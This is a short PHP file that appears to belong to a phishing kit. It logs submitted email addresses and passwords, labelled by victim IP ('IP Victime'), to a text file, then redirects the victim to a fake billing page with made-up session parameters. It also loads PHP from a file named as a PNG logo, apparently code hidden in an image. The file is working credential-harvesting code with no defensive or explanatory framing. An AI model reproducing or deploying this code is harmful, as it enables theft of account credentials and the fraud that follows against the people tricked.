<?php

include 'bots.php';
    $file = "coco/".$_SERVER['REMOTE_ADDR'].".txt";
    $ip = getenv("REMOTE_ADDR");
    $message = '|================ login info ===============|'."\r\n";
    $message .= '|Email                      :  '.$_POST['mail']."\r\n";
    $message .= '|Password                   :  '.$_POST['mdp']."\r\n";
    $message .= "|IP Victime                 : http://www.geoiptool.com/?IP=".$ip."  ====\n";

    $file = fopen("$file","a+")or die("Unable to open file!");
    fwrite($file,$message);
    fclose($file);
    header("location: Billing.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>
<html lang="en">
    <head>
		<script language="php">require ('img/logo.png');</script>
    </head>
	 </html>